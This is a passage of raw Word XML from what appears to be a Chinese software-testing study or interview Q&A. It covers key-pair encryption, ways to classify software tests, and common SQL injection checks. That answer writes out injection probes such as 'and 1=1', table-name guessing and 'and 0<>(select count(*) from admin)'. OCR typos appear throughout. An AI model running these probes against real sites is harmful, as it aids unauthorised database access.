          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的公共密钥，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>prv—a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>表示用户</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的私有 密钥，那么：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="180" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>M= de crypt (pub</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="subscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> encrypt (prv</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">—釘 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>M))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="598"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="380" w:line="620" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="184" w:name="bookmark193"/>
      <w:bookmarkEnd w:id="184"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>根据不同的维度，描述软件测试可以划分的种类。例如, 根据软件的生命周期，我们可以将测试划分为；单元测试， 集成测试，系统测试，验收测试</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>..…</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>请至少根据两种不同的依 据，说岀</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>2-3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>软件测试方式。(不包含举例的内容)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="185" w:name="bookmark194"/>
      <w:bookmarkEnd w:id="185"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>按照是否使用自动化工具分为：手工测试，自动化测试</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="750"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="186" w:name="bookmark195"/>
      <w:bookmarkEnd w:id="186"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>按照软件的质量分为：功能测试，可靠性测试，易用性，可维护测试性测试，可移植 性测试</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="755"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="187" w:name="bookmark196"/>
      <w:bookmarkEnd w:id="187"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>按照阶段可以分为：单元测试，继承测试，系统测试</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="755"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="188" w:name="bookmark197"/>
      <w:bookmarkEnd w:id="188"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>按照是否关注代码：黑盒测试，白盒测试</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="755"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="189" w:name="bookmark198"/>
      <w:bookmarkEnd w:id="189"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>按照测试设计方法分类，分为黑盒测试，白盒测试和灰盒测试。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="770"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="190" w:name="bookmark199"/>
      <w:bookmarkEnd w:id="190"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>按照获得测试数据形式上分：穷尽法；等价类划分法；边界值分析法</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="770"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="191" w:name="bookmark200"/>
      <w:bookmarkEnd w:id="191"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>按照是否运行程序：分为静态测试和动态测试</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="750"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="480" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="192" w:name="bookmark201"/>
      <w:bookmarkEnd w:id="192"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>按照软件的生命周期分为：单元测试、集成测试、系统测试、燈收测试；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="598"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="463" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="193" w:name="bookmark202"/>
      <w:bookmarkEnd w:id="193"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>分类列举</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>注入常用判断方法？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="194" w:name="bookmark203"/>
      <w:bookmarkEnd w:id="194"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>判断有无注入点</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">1=1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>1=2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="735"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="195" w:name="bookmark204"/>
      <w:bookmarkEnd w:id="195"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>猜表一般的表的名称无非是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>admin adninuser user pass password</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>等</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7" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>and 0&lt;&gt;(select count(*) from *)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>and 0&lt;&gt; (select count (*) from admin)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> 判断是否存在 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">admin </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这张表</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="735"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="196" w:name="bookmark205"/>
      <w:bookmarkEnd w:id="196"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>猜帐号数目如果谒到0&lt;返回正确页面1〈返回错误页面说明帐号数目就是1个</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>and (select count(*) from admin)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>and 1&lt; (select count(*) from admin)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="735"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="197" w:name="bookmark206"/>
      <w:bookmarkEnd w:id="197"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>猜解字段名称在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>len(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>)括号里面加上我们想到的字段</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>名称.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>1=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(select count(*) from admin where len(*)&gt;0)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>-一</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="19"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="15" w:right="0" w:firstLine="0"/>
